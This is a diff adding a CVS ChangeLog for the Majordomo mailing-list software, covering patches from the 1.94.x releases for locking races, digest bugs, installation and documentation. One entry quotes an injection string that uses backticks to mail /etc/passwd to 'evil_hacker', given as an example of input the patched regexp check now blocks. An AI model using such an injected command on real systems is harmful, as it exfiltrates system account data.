@@ -1,0 +1,2418 @@
+Changes since 1.94.3:
+
+archive2.pl     1.10:1.9
+        revision 1.10
+        date: 1997/08/27 15:07:44;  author: cwilson;  state: Exp;  lines: +22 -7
+        From: coar@decus.org (Rodent of Unusual Size)
+        Message-id: <97071613415025@decus.org>
+
+        o capability for 4 digit years
+
+            However, just in case it's not, here's a patch to archive2.pl that
+            adds -D, -M, and -Y flags that have the same meanings as their
+            lower-case counterparts - except that the year is 4 digits rather
+            than 2.
+        ----------------------------
+config-test     1.18:1.17
+        revision 1.18
+        date: 1997/08/27 15:17:13;  author: cwilson;  state: Exp;  lines: +3 -3
+        o  Checks to make sure that $log is actually a file.
+        ----------------------------
+config_parse.pl 1.64:1.63
+        revision 1.64
+        date: 1997/08/27 14:41:32;  author: cwilson;  state: Exp;  lines: +17 -1
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/config_majordomo.0 ]
+
+        From: Bill Houle <Bill.Houle@SanDiegoCA.NCR.COM>
+        Message-Id: <3.0.32.19970430180123.00989de0@www.sandiegoca.ncr.com>
+
+        The following patches implement the 'welcome=yes/no' and
+        'announcements=yes/no' keywords for Majordomo 1.94.3. Both features have
+        been requested several times on the -users mailing list. In the past I had
+        described how our site implemented these for 1.93 using the new_keyword()
+        API function call, but since I am in the process of upgrading I figured I'd
+        do it this time as a real patch. I submit them for local implementation and
+        hopeful incorporation into 1.94.4. (Yes, I know these are new features
+        which are not typical for inclusion in a point release. But heck, they are
+        so simple its laughable...)
+        ----------------------------
+digest  1.23:1.22
+        revision 1.23
+        date: 1997/08/27 14:42:52;  author: cwilson;  state: Exp;  lines: +30 -13
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/digest.0 ]
+
+        From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+        Message-Id: <199703191509.JAA11070@miaow.risc.sps.mot.com>
+
+        These patches fix some problems recently identified in digest, but are
+        virtually untested. They address undefined variables when the non-C form
+        of configuration is used and file globbing failures (i.e. "No messages"
+        aborts when there are plenty of messages to digest). While I have the
+        highest confidence in the changes, unless someone can verify them I
+        can't that they be placed in the release. They should be tested
+        *both* with and without using the -C option.
+        ----------------------------
+majordomo       1.88:1.87
+        revision 1.88
+        date: 1997/08/27 14:55:29;  author: cwilson;  state: Exp;  lines: +21 -41
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/majordomo.0 ]
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/majordomo.1 ]
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/majordomo.2 ]
+
+        From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+        Message-Id: <199705011522.KAA14948@miaow.risc.sps.mot.com>
+
+        o Race condition:
+
+           The problem is a window when Mj is unsubscribing an address between the
+           time the list file is unlinked and the updated file is linked to the
+           list file name.
+
+        From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+        Message-Id: <199705022106.QAA20060@miaow.risc.sps.mot.com>
+
+        o Config lock not being freed:
+
+           I discovered a case when a config lock isn't freed when newconfig fails
+           due to errors in the settings then a following (in the same message)
+           config or writeconfig command fails because set_lock() is called again
+           without the lock ever being freed. I suppose I could make set_lock()
+           less picky, but the problem is actually bad logic in do_newconfig(), so
+           I'd rather fix that. Here's the patch against 1.94.3:
+
+        From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+        Message-Id: <199705051358.IAA15196@miaow.risc.sps.mot.com>
+
+        o  EOF tests failing due to intervening filehandle resets.
+
+           Since I use my lockf() version of shlock.pl, I discovered that the tests
+           for eof on the command input stream in do_newinfo() and do_newintro()
+           make a rather tenuous assumption in at least one case for each function
+           because there's an intervening log() call (and resulting file locking)
+           between the last input from the command stream and the eof test on the
+           last filehandle read.
+        ----------------------------
+majordomo.pl    1.56:1.55
+        revision 1.56
+        date: 1997/08/27 14:58:53;  author: cwilson;  state: Exp;  lines: +10 -10
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/majordomo.pl.0 ]
+
+        From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+        Message-Id: <199705201456.JAA04154@miaow.risc.sps.mot.com>
+
+        o Mungedomain doesn't work due to is_list_member() bug
+
+           > > The problem I am having is that mungedomain seems not to work
+           > > when the subscribed person is a@b.c and the From: line in the
+           > > mail is a@d.b.c. [ on 1.94.3 ]
+           >
+           > You have also found a bug. It's even worse if you list a file other than
+           > the list in 'restrict_post'. I'm working on it but since I'm out this
+           > afternoon and have a training class the next 2 days, it may be awhile
+           > before I have a patch for it.
+           >
+           > For those who care, is_list_member() in majordomo.pl clobbers
+           > $clean_list before it uses it to call cf_ck_bool() to get the value
+           > of 'mungedomain'. Then there's the problem of it not making sure that
+           > get_config() has been called for $clean_list, not to mention that resend
+           > calls is_list_member() with the value of 'restrict_post' that might not
+           > even be a list at all!
+
+           Turns out this wasn't as tricky as I feared once I made the assumption
+           that only the "current list" 'mungedomain' applied. Here's patches
+           against 1.94.3:
+        ----------------------------
+resend  1.86:1.85
+        revision 1.86
+        date: 1997/08/27 14:59:24;  author: cwilson;  state: Exp;  lines: +4 -8
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/majordomo.pl.0 ]
+
+        From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+        Message-Id: <199705201456.JAA04154@miaow.risc.sps.mot.com>
+
+        o Mungedomain doesn't work due to is_list_member() bug
+
+           > > The problem I am having is that mungedomain seems not to work
+           > > when the subscribed person is a@b.c and the From: line in the
+           > > mail is a@d.b.c. [ on 1.94.3 ]
+           >
+           > You have also found a bug. It's even worse if you list a file other than
+           > the list in 'restrict_post'. I'm working on it but since I'm out this
+           > afternoon and have a training class the next 2 days, it may be awhile
+           > before I have a patch for it.
+           >
+           > For those who care, is_list_member() in majordomo.pl clobbers
+           > $clean_list before it uses it to call cf_ck_bool() to get the value
+           > of 'mungedomain'. Then there's the problem of it not making sure that
+           > get_config() has been called for $clean_list, not to mention that resend
+           > calls is_list_member() with the value of 'restrict_post' that might not
+           > even be a list at all!
+
+           Turns out this wasn't as tricky as I feared once I made the assumption
+           that only the "current list" 'mungedomain' applied. Here's patches
+           against 1.94.3:
+        ----------------------------
+sample.cf       1.34:1.33
+        revision 1.34
+        date: 1997/08/27 15:00:31;  author: cwilson;  state: Exp;  lines: +3 -3
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/sample.cf.0 ]
+        [ ftp://sol.ccsf.cc.ca.us/majordomo-patches/1.94.3/sample.cf.1 ]
+
+        o Uncommented $config'default_subscribe_policy
+        o made the sample taboo stuff valid perl5.
+        ----------------------------
+wrapper.c       1.8:1.7
+        revision 1.8
+        date: 1997/08/27 15:01:12;  author: cwilson;  state: Exp;  lines: +6 -4
+        o  Fixes security hole with ENV overrun by limiting env size.
+        ----------------------------
+
+Changes since 1.94.2:
+o  Quick respin to remove spurious wrapper and fix medit.
+
+Changes since 1.94.1:
+
+Doc/list-owner-info	1.9:1.10
+	revision 1.10
+	date: 1997/04/05 19:18:10;  author: cwilson;  state: Exp;  lines: +4 -4
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199704031832.MAA19186@miaow.risc.sps.mot.com>
+	o  more documentation fixes.
+	----------------------------
+Doc/majordomo-faq.html	1.2:1.3
+	revision 1.3
+	date: 1997/04/27 14:57:00;  author: cwilson;  state: Exp;  lines: +85 -48
+	latest revisions
+	----------------------------
+Doc/majordomo-faq.txt	1.1:1.2
+	revision 1.2
+	date: 1997/04/27 14:57:05;  author: cwilson;  state: Exp;  lines: +929 -854
+	latest revisions
+	----------------------------
+Doc/man/digest.1	1.3:1.4
+	revision 1.4
+	date: 1997/04/20 16:25:43;  author: cwilson;  state: Exp;  lines: +5 -2
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-Id: <199704170123.SAA07648@rock.west.ora.com>
+	
+	o The three-argument form of mkdigest hasn't been covered in digest.1
+	  and majordomo.8
+	----------------------------
+Doc/man/majordomo.8	1.4:1.5
+	revision 1.5
+	date: 1997/04/20 16:25:49;  author: cwilson;  state: Exp;  lines: +45 -3
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-Id: <199704170123.SAA07648@rock.west.ora.com>
+	
+	o The three-argument form of mkdigest hasn't been covered in digest.1
+	  and majordomo.8
+	----------------------------
+INSTALL	1.7:1.10
+	revision 1.10
+	date: 1997/04/20 16:10:30;  author: cwilson;  state: Exp;  lines: +12 -10
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199704102032.PAA19530@miaow.risc.sps.mot.com>
+	
+	o  More doc nits for 1.94.2
+	----------------------------
+	revision 1.9
+	date: 1997/03/11 10:19:33;  author: cwilson;  state: Exp;  lines: +21 -21
+	o  Swap steps 8 and 9 -- alias setup before attempting to register.
+	----------------------------
+	revision 1.8
+	date: 1997/03/11 10:11:59;  author: cwilson;  state: Exp;  lines: +1 -1
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-ID: <17276.852523071@rubble.west.ora.com>
+	
+	o  Wrong filename in 1.94.1 INSTALL file
+	----------------------------
+Makefile	1.56:1.61
+	revision 1.61
+	date: 1997/04/27 14:55:50;  author: cwilson;  state: Exp;  lines: +4 -7
+	From: Nicole LaRock Decker <larock@oswego.edu>
+	Message-ID: <Pine.SOL.3.96.970421101350.26100A-100000@athena.oswego.edu>
+	
+	o  fixes bounce-remind and bounce pointing at each other.
+	----------------------------
+	revision 1.60
+	date: 1997/03/12 16:50:46;  author: cwilson;  state: Exp;  lines: +5 -5
+	o version 1.94.2
+	----------------------------
+	revision 1.59
+	date: 1997/03/11 10:15:16;  author: cwilson;  state: Exp;  lines: +9 -4
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-ID: <15010.852502798@rubble.west.ora.com>
+	
+	o  install resend.1 and bounce.1
+	
+	Message-ID: <15389.852505074@rubble.west.ora.com>
+	
+	o  change install.sh flag from -o to -O:
+	    I'm using SunOS 4.1.3, one of the systems (with filesystem quotas)
+	    that only allows root to use chown.  As far as I can tell, the 1.94.1
+	    Makefile is supposed to be runnable by the Majordomo user.  It fails
+	    because install.sh tries to run chown as a non-root user:
+	
+	    	% make install-scripts
+	    	Testing for perl (/usr/local/bin/perl)...
+	    	Configuring scripts...
+	    	./install.sh -m 751 -o 123 -g 45 . /tmp/majordomo
+	    	Must be root to use chown
+	    	*** Error code 1
+	    	make: Fatal error: Command failed for target `install-scripts'
+	
+	    I haven't followed this problem real closely since I griped about it
+	    for 1.94.  I'm sending a patch (below) that seems to work for 1.94.1.
+	
+	    The install.sh script has two flags for setting ownership, -o and -O.
+	    If you use -o, it seems to always do chown.  But if you use -O, it will
+	    only do chown if it's running as root.  So my fix just changes that flag.
+	
+	    I haven't tested this as root -- or on other systems (that let non-root
+	    users do chown).  Someone should!
+	----------------------------
+	revision 1.58
+	date: 1997/03/11 09:59:27;  author: cwilson;  state: Exp;  lines: +7 -3
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-ID: <3908.853689282@rubble.west.ora.com>
+	
+	o  install bounce and resend man pages instead of a stub file.
+	----------------------------
+	revision 1.57
+	date: 1997/03/10 16:08:09;  author: cwilson;  state: Exp;  lines: +4 -4
+	From:       dwolfe@risc.sps.mot.com (Dave Wolfe)
+	Message-ID: 199701081942.NAA16946@miaow.risc.sps.mot.com
+	
+	o A little fix to help idiot-proof the installation since directories
+	  almost always return true for "test -x":
+	----------------------------
+NEWLIST	1.3:1.5
+	revision 1.5
+	date: 1997/04/02 10:32:06;  author: cwilson;  state: Exp;  lines: +6 -6
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199703241956.NAA12000@miaow.risc.sps.mot.com>
+	
+	o  1.94 -> 1.94.2
+	----------------------------
+	revision 1.4
+	date: 1997/03/11 10:01:17;  author: cwilson;  state: Exp;  lines: +10 -11
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-ID: <1447.853639763@rubble.west.ora.com>
+	
+	o  small nits and typos.
+	----------------------------
+README	1.36:1.38
+	revision 1.38
+	date: 1997/04/20 16:10:39;  author: cwilson;  state: Exp;  lines: +4 -4
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199704102032.PAA19530@miaow.risc.sps.mot.com>
+	
+	o  More doc nits for 1.94.2
+	----------------------------
+	revision 1.37
+	date: 1997/04/07 18:56:56;  author: cwilson;  state: Exp;  lines: +19 -18
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199704071503.KAA16480@miaow.risc.sps.mot.com>
+	
+	o  more doc fixes.
+	----------------------------
+approve	1.13:1.15
+	revision 1.15
+	date: 1997/04/05 19:18:36;  author: cwilson;  state: Exp;  lines: +4 -3
+	o  Eliminate the "apparently-to" bit
+	----------------------------
+	revision 1.14
+	date: 1997/04/02 10:34:09;  author: cwilson;  state: Exp;  lines: +10 -3
+	o  tries slightly to find the right sendmail.
+	----------------------------
+config-test	1.15:1.17
+	revision 1.17
+	date: 1997/03/10 17:22:05;  author: cwilson;  state: Exp;  lines: +2 -2
+	make config-test execute itself with arguments if it has to.
+	
+		"I don't want to die."
+			"You must, and with a -foo -zot -bang"
+		"Oh, well, okay."
+	----------------------------
+	revision 1.16
+	date: 1997/03/10 15:45:12;  author: cwilson;  state: Exp;  lines: +9 -8
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199702262130.PAA15843@miaow.risc.sps.mot.com>
+	
+	o Patches to fix nits in config-test  -w fixes primarily.
+	----------------------------
+config_parse.pl	1.60:1.63
+	revision 1.63
+	date: 1997/04/20 16:06:58;  author: cwilson;  state: Exp;  lines: +15 -9
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199704160058.TAA16410@miaow.risc.sps.mot.com>
+	
+	o  tighten up the regexp check in grab_regexp_array so that
+	   things like
+		 1; `/bin/mail evil_hacker < /etc/passwd` ; 0
+	   aren't allowed.
+	----------------------------
+	revision 1.62
+	date: 1997/03/10 17:19:54;  author: cwilson;  state: Exp;  lines: +17 -8
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199702202147.PAA14970@miaow.risc.sps.mot.com>
+	
+	o  Locking patch:
+	
+	|I've suspected for quite awhile that list.config file locking had some
+	|holes in it. I can confirm this now by simply mailing off sequences of
+	|writeconfig, newconfig, config commands in each of 20 messages (although
+	|it doesn't take that many) at one-second intervals. I get the full array
+	|of aborts, warnings, invalid passwords, and even a few successes in
+	|response. After making the changes that generated this patch, every
+	|command succeeds, although the config files returned are unpredictable
+	|since there's no locking between each command in a message (I think
+	|that may also be a hole or a feature, depending on your point of view,
+	|but at least it doesn't clobber the file as a result). But first, a
+	|little background for anyone who's interested and to facilitate your
+	|checking that I've covered all the cases and haven't introduced yet more
+	|problems.
+	|
+	|There are two locking mechanisms involved in list config files. One is
+	|specific to the config file itself, which I'll refer to as the "L.lock",
+	|and is implemented through lopen() by creating a lock file with an
+	|"L." prefix. The other is for the set of list config files, including
+	|various temporary files, which I'll refer to as the "lock.LOCK" and is
+	|implemented by higher level functions calling set_lock() with the list
+	|config file name suffixed by ".LOCK" for the lock file name.
+	|
+	|The core functions which manipulate list config locking include:
+	|
+	|writeconfig -- This is a low-level function that writes a list config
+	|file from the current in-memory settings. It assumes the lock.LOCK is
+	|set but doesn't use any L.locks for either its temporary file
+	|(*.config.out) or the config file.
+	|
+	|get_config -- This low-level function sets the lock.LOCK and
+	|conditionally calls writeconfig() to set configuration defaults if no
+	|list config file exists. It then L.locks and reads the list config file
+	|to set up the in-memory configuration, releases the L.lock and then the
+	|lock.LOCK.
+	|
+	|do_config -- This high-level function calls get_config() but uses no
+	|locks while copying the list config file to the mailer to fulfill the
+	|request.
+	|
+	|do_newconfig -- This high-level function calls get_config(), L.locks the
+	|new list config file while it writes it, but releases it before setting
+	|the lock.LOCK while renaming the old and new list config files.
+	|
+	|do_writeconfig -- This high-level function calls get_config() and then
+	|calls writeconfig() without any sort of locking.
+	|
+	|digest uses lock.LOCKing in a rather brute force manner (i.e. almost the
+	|entire time it's working), but it's not apparent that anything less will
+	|work.
+	|
+	|
+	|Several locking windows are apparent in the high-level functions.
+	|
+	|do_config releases all locks (via get_config()) before copying the
+	|(possibly changed) list config file to the mailer.
+	|
+	|do_newconfig replaces the list config file with a file that it may
+	|not have written (since it releases the L.lock on the new file before
+	|obtaining the lock.LOCK), which could cause newconfig commands to appear
+	|to execute out of order (but this is a problem inherent in MTA queueing
+	|anyway), and similarly verify a password that's no longer valid if the
+	|list config file is replaced between the return from get_config() and
+	|either subsequent lock.
+	|
+	|do_writeconfig could completely mangle the list config file since it
+	|fails to honor any extant locks.
+	|
+	|In addition, two levels of locking seems to be overkill. A persistent
+	|lock such as is the lock.LOCKing is necessary and easy to use, although
+	|perhaps a bit coarse. Using L.locking in addition is simply needless
+	|overhead.
+	|
+	|The fix is to set the lock.LOCK around all list config file manipulation
+	|for each of the do_*config commands. Since locks can't be nested, the
+	|fact that the lock.LOCK is already set (and must not be released) is
+	|communicated to get_config by adding an optional third argument to
+	|get_config. When this argument is true, get_config doesn't attempt to
+	|set or free the lock.LOCK for the config file. Appropriate changes are
+	|made in each of the do_*config functions to set and free the lock.LOCK
+	|and call get_config with the new third argument set. Additionally, calls
+	|to lopen/lclose under a lock.LOCK were simplified to open/close calls to
+	|reduce overhead. All other calls to get_config are left as is to allow
+	|get_config to set the lock.LOCK while it defaults/reads the list config
+	|file.
+	|
+	|The following patches implement this fix to the problems noted above.
+	|They apply to an unpatched 1.94.1:
+	----------------------------
+	revision 1.61
+	date: 1997/03/10 16:14:41;  author: cwilson;  state: Exp;  lines: +43 -27
+	From:       dwolfe@risc.sps.mot.com (Dave Wolfe)
+	
+	o  tidy up the documentation a bit.
+	----------------------------
+contrib/archive_mh.pl	1.3:1.4
+	revision 1.4
+	date: 1997/03/10 15:40:41;  author: cwilson;  state: Exp;  lines: +3 -3
+	typo:  require
+	----------------------------
+contrib/makeindex.pl	1.4:1.5
+	revision 1.5
+	date: 1997/03/11 10:04:47;  author: cwilson;  state: Exp;  lines: +1 -1
+	From: Bill <bill@wagill.com>
+	Message-Id: <1.5.4.32.19970117000234.006bfee8@mail.nas.com>
+	
+	o  catches cc:mail reply prefixes "Re[3]"
+	----------------------------
+digest	1.20:1.22
+	revision 1.22
+	date: 1997/03/10 17:11:25;  author: cwilson;  state: Exp;  lines: +5 -5
+	o  use -c configfile to specify a different config file.
+	----------------------------
+	revision 1.21
+	date: 1997/03/10 15:49:26;  author: cwilson;  state: Exp;  lines: +21 -14
+	From: Oliver Xymoron <oxymoron@waste.org>
+	Message-ID: <Pine.LNX.3.95.970107112615.31531G-100000@waste.org>
+	
+	o This changes digest to use a reasonable default for resend_host if it
+	  is unset.
+	
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199703062200.QAA19582@miaow.risc.sps.mot.com>
+	
+	o Since I don't run any digests, I didn't give digest the same close
+	  scrutiny, and decided it was adequate (I'd already fixed one locking
+	  problem there). Recent analysis in light of problems experienced by
+	  digest users (posting to Mj-users) has convinced me that there are still
+	  a couple of problems with digest's locking.
+	
+	  The first is, that no matter which kind of configuration is used,
+	  the lock is not established until after the volume/issue counts are
+	  read from the respective config files, which could cause incorrect
+	  incrementing of counts. Secondly, in the case of the -C option, the
+	  list-digest.config file is updated without being locked at all, which
+	  could cause loss of counts or configuration parameters.
+	
+	  This patch should take care of the problems so long as -C and non-C
+	  invocations of digest are *not* used for the same list. Although the
+	  changes are pretty straight forward, I didn't want this patch to miss
+	  1.94.2 so I publishing it without complete testing. I will try to run
+	  some tests in the next week however. This is against unpatched 1.94.1.
+	----------------------------
+majordomo	1.76:1.87
+	revision 1.87
+	date: 1997/04/20 16:11:49;  author: cwilson;  state: Exp;  lines: +4 -3
+	From: "Kendall P. Bullen" <kendall@lists.tax.org>
+	Message-ID: <Pine.LNX.3.95.970412025050.10642B-100000@lists.tax.org>
+	
+	o  skip directories in do_lists.
+	----------------------------
+	revision 1.86
+	date: 1997/04/20 16:07:30;  author: cwilson;  state: Exp;  lines: +4 -4
+	From: "Russell Steinthal" <rms39@columbia.edu>
+	Message-Id: <199704080042.UAA20817@mailrelay1.cc.columbia.edu>
+	
+	o  help message fix.
+	----------------------------
+	revision 1.85
+	date: 1997/04/02 11:31:15;  author: cwilson;  state: Exp;  lines: +13 -13
+	From: Brock Rozen <brozen@webdreams.com>
+	Message-Id: <Pine.OSF.3.96.970401111913.26813C-100000@webdreams.com>
+	
+	o Patch for text errors in 1.94.2 in majordomo
+	----------------------------
+	revision 1.84
+	date: 1997/04/02 10:33:38;  author: cwilson;  state: Exp;  lines: +5 -5
+	o  adds subscriber to notification messages sent to owner.
+	----------------------------
+	revision 1.83
+	date: 1997/04/02 09:29:55;  author: cwilson;  state: Exp;  lines: +9 -5
+	o  Fixed comment on rcs|cvs|core line
+	o  fixed "this is version $majordomo_version"
+	----------------------------
+	revision 1.82
+	date: 1997/03/12 16:51:00;  author: cwilson;  state: Exp;  lines: +17 -17
+	o  those pesky @ signs.
+	----------------------------
+	revision 1.81
+	date: 1997/03/11 10:44:58;  author: cwilson;  state: Exp;  lines: +193 -4
+	From: "Roger B.A. Klorese" <rogerk@queernet.org>
+	Message-Id: <3.0.1.32.19970120185923.0306366c@pop.queernet.org>
+	
+	o  MajorDumbo help file (insert smiley here)
+	   additional dumbo-user text from do_help.
+	----------------------------
+	revision 1.80
+	date: 1997/03/10 17:20:00;  author: cwilson;  state: Exp;  lines: +36 -32
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199702202147.PAA14970@miaow.risc.sps.mot.com>
+	
+	o  Locking patch:
+	
+	|I've suspected for quite awhile that list.config file locking had some
+	|holes in it. I can confirm this now by simply mailing off sequences of
+	|writeconfig, newconfig, config commands in each of 20 messages (although
+	|it doesn't take that many) at one-second intervals. I get the full array
+	|of aborts, warnings, invalid passwords, and even a few successes in
+	|response. After making the changes that generated this patch, every
+	|command succeeds, although the config files returned are unpredictable
+	|since there's no locking between each command in a message (I think
+	|that may also be a hole or a feature, depending on your point of view,
+	|but at least it doesn't clobber the file as a result). But first, a
+	|little background for anyone who's interested and to facilitate your
+	|checking that I've covered all the cases and haven't introduced yet more
+	|problems.
+	|
+	|There are two locking mechanisms involved in list config files. One is
+	|specific to the config file itself, which I'll refer to as the "L.lock",
+	|and is implemented through lopen() by creating a lock file with an
+	|"L." prefix. The other is for the set of list config files, including
+	|various temporary files, which I'll refer to as the "lock.LOCK" and is
+	|implemented by higher level functions calling set_lock() with the list
+	|config file name suffixed by ".LOCK" for the lock file name.
+	|
+	|The core functions which manipulate list config locking include:
+	|
+	|writeconfig -- This is a low-level function that writes a list config
+	|file from the current in-memory settings. It assumes the lock.LOCK is
+	|set but doesn't use any L.locks for either its temporary file
+	|(*.config.out) or the config file.
+	|
+	|get_config -- This low-level function sets the lock.LOCK and
+	|conditionally calls writeconfig() to set configuration defaults if no
+	|list config file exists. It then L.locks and reads the list config file
+	|to set up the in-memory configuration, releases the L.lock and then the
+	|lock.LOCK.
+	|
+	|do_config -- This high-level function calls get_config() but uses no
+	|locks while copying the list config file to the mailer to fulfill the
+	|request.
+	|
+	|do_newconfig -- This high-level function calls get_config(), L.locks the
+	|new list config file while it writes it, but releases it before setting
+	|the lock.LOCK while renaming the old and new list config files.
+	|
+	|do_writeconfig -- This high-level function calls get_config() and then
+	|calls writeconfig() without any sort of locking.
+	|
+	|digest uses lock.LOCKing in a rather brute force manner (i.e. almost the
+	|entire time it's working), but it's not apparent that anything less will
+	|work.
+	|
+	|
+	|Several locking windows are apparent in the high-level functions.
+	|
+	|do_config releases all locks (via get_config()) before copying the
+	|(possibly changed) list config file to the mailer.
+	|
+	|do_newconfig replaces the list config file with a file that it may
+	|not have written (since it releases the L.lock on the new file before
+	|obtaining the lock.LOCK), which could cause newconfig commands to appear
+	|to execute out of order (but this is a problem inherent in MTA queueing
+	|anyway), and similarly verify a password that's no longer valid if the
+	|list config file is replaced between the return from get_config() and
+	|either subsequent lock.
+	|
+	|do_writeconfig could completely mangle the list config file since it
+	|fails to honor any extant locks.
+	|
+	|In addition, two levels of locking seems to be overkill. A persistent
+	|lock such as is the lock.LOCKing is necessary and easy to use, although
+	|perhaps a bit coarse. Using L.locking in addition is simply needless
+	|overhead.
+	|
+	|The fix is to set the lock.LOCK around all list config file manipulation
+	|for each of the do_*config commands. Since locks can't be nested, the
+	|fact that the lock.LOCK is already set (and must not be released) is
+	|communicated to get_config by adding an optional third argument to
+	|get_config. When this argument is true, get_config doesn't attempt to
+	|set or free the lock.LOCK for the config file. Appropriate changes are
+	|made in each of the do_*config functions to set and free the lock.LOCK
+	|and call get_config with the new third argument set. Additionally, calls
+	|to lopen/lclose under a lock.LOCK were simplified to open/close calls to
+	|reduce overhead. All other calls to get_config are left as is to allow
+	|get_config to set the lock.LOCK while it defaults/reads the list config
+	|file.
+	|
+	|The following patches implement this fix to the problems noted above.
+	|They apply to an unpatched 1.94.1:
+	----------------------------
+	revision 1.79
+	date: 1997/03/10 17:14:28;  author: cwilson;  state: Exp;  lines: +6 -3
+	o  make sure a lists command returns something for the user.
+	----------------------------
+	revision 1.78
+	date: 1997/03/10 17:11:50;  author: cwilson;  state: Exp;  lines: +4 -4
+	o  a better check to ignore RCS|CVS|core files/dirs.
+	----------------------------
+	revision 1.77
+	date: 1997/03/10 15:55:15;  author: cwilson;  state: Exp;  lines: +17 -11
+	From:       dwolfe@risc.sps.mot.com (Dave Wolfe)
+	Message-ID: 199612302041.OAA16225@miaow.risc.sps.mot.com
+	
+	o  Fixes approve acceppeted commands lose arguments
+	
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199701201709.LAA06157@miaow.risc.sps.mot.com>
+	 ( oxymoron@waste.org (Oliver Xymoron) )
+	
+	o  Security fix: "unsubscribe *" won't mention hidden lists
+	
+	From: coar@decus.org (Rodent of Unusual Size)
+	Message-Id: <97012711105403@decus.org>
+	
+	o     Concerning WriteConfig's creating an output file based upon the
+	    input list name rather than the case-smashed one: found the problem.
+	
+	From:       brozen@webdreams.com (Brock Rozen)
+	Message-ID: Pine.OSF.3.95.970106122125.11202C-100000@webdreams.com
+	
+	o   Slightly different text for subscribe message
+	----------------------------
+majordomo.aliases	1.1:1.2
+	revision 1.2
+	date: 1997/04/02 10:32:32;  author: cwilson;  state: Exp;  lines: +3 -3
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199703241956.NAA12000@miaow.risc.sps.mot.com>
+	
+	o  1.94 -> 1.94.2
+	----------------------------
+majordomo.pl	1.52:1.55
+	revision 1.55
+	date: 1997/04/02 14:04:14;  author: cwilson;  state: Exp;  lines: +4 -4
+	o added $EX_NOUSER
+	----------------------------
+	revision 1.54
+	date: 1997/04/02 09:12:35;  author: cwilson;  state: Exp;  lines: +4 -4
+	hack fix to ParseAddrs to allow "john doe"@x.y addresses
+	----------------------------
+	revision 1.53
+	date: 1997/03/10 16:07:14;  author: cwilson;  state: Exp;  lines: +27 -22
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199701201535.JAA13519@miaow.risc.sps.mot.com>
+	 ^^^^^^^ MAJORDOMO-USERS ARCHIVE!  ^^^^^^^^^^^^^
+	
+	o fixes regexp at line 519
+	o tidy up is_list_member to handle absolute paths in restrict_post variable.
+	
+	From:       dwolfe@risc.sps.mot.com (Dave Wolfe)
+	Message-ID: 199702261507.JAA14866@miaow.risc.sps.mot.com
+	
+	o log file doesn't exist regexp bug
+	----------------------------
+majordomo_version.pl	1.18:1.24
+	revision 1.24
+	date: 1997/04/27 15:05:38;  author: cwilson;  state: Exp;  lines: +2 -2
+	1.94.2
+	----------------------------
+	revision 1.23
+	date: 1997/04/20 16:48:22;  author: cwilson;  state: Exp;  lines: +2 -2
+	o  spin4, but really call it 1.94.2_spin4
+	----------------------------
+	revision 1.22
+	date: 1997/04/20 16:43:01;  author: cwilson;  state: Exp;  lines: +2 -2
+	o  spin4, but call it 1.94.2.
+	----------------------------
+	revision 1.21
+	date: 1997/04/07 18:59:16;  author: cwilson;  state: Exp;  lines: +2 -2
+	o  spin 3
+	----------------------------
+	revision 1.20
+	date: 1997/04/02 14:05:15;  author: cwilson;  state: Exp;  lines: +2 -2
+	o  spin #2
+	----------------------------
+	revision 1.19
+	date: 1997/03/12 16:51:16;  author: cwilson;  state: Exp;  lines: +2 -2
+	o  bump the version # to .2_spin1
+	----------------------------
+medit	1.7:1.9
+	revision 1.9
+	date: 1997/04/27 14:56:14;  author: cwilson;  state: Exp;  lines: +4 -3
+	o  chdir correctly.
+	----------------------------
+	revision 1.8
+	date: 1997/04/20 16:25:08;  author: cwilson;  state: Exp;  lines: +3 -3
+	From: Jerry Peek <jpeek@jpeek.com>
+	Message-Id: <199704171515.LAA02975@hrothgar.gw.com>
+	
+	o I also found what looks like another bug: if $listdir isn't defined,
+	  then the chdir to $listdir *succeeds* and the call to die() isn't
+	  executed.
+	----------------------------
+resend	1.80:1.85
+	revision 1.85
+	date: 1997/04/02 14:04:48;  author: cwilson;  state: Exp;  lines: +8 -4
+	o  don't abort if mailer is sendmail and sendmail exits with EX_NOUSER
+	----------------------------
+	revision 1.84
+	date: 1997/04/02 10:39:50;  author: cwilson;  state: Exp;  lines: +8 -3
+	o  Defaults for MAX_HEADER_LINE_LENGTH and MAX_TOTAL_HEADER_LENGTH
+	   if they aren't defined.
+	----------------------------
+	revision 1.83
+	date: 1997/04/02 09:27:17;  author: cwilson;  state: Exp;  lines: +4 -4
